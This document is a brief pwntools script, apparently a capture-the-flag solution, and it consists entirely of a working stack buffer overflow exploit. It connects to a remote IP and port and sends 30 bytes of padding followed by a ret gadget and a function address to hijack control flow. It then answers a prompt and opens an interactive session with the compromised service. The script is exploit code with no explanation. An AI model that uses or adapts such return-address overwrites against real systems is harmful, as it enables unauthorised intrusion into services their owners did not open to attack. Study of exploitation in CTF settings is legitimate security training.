from pwn import *
r = remote("65.2.136.80", 30698)

payload = b"a"*30 + p64(0x000000000040101a) + p64(0x401383)# + p64(0x4013b9)
r.sendline(payload)
r.sendline(b"n")

r.interactive()